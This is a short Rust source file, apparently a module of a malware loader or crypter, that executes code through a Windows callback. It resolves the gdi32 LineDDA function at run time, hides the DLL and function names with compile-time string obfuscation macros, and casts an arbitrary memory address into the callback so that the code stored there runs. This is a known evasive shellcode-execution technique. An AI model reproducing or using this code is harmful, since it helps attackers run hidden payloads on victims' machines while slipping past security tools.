pub unsafe fn exec(p: usize) -> Result<(), String> {
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::mem::transmute;

    let gdi32 = load_library(obf_lit_bytes!(b"gdi32.dll\0").as_slice())?;
    let p_linedda = get_proc_address(gdi32, obf_lit_bytes!(b"LineDDA\0").as_slice())?;

    type LineDDAFn = unsafe extern "system" fn(i32, i32, i32, i32, unsafe extern "system" fn(i32, i32, isize), isize) -> i32;
    let linedda: LineDDAFn = transmute(p_linedda);

    let ret = linedda(0, 0, 1, 1, transmute(p), 0);
    if ret == 0 {
        return Err(obf_lit!("LineDDA failed").to_string());
    }
    Ok(())
}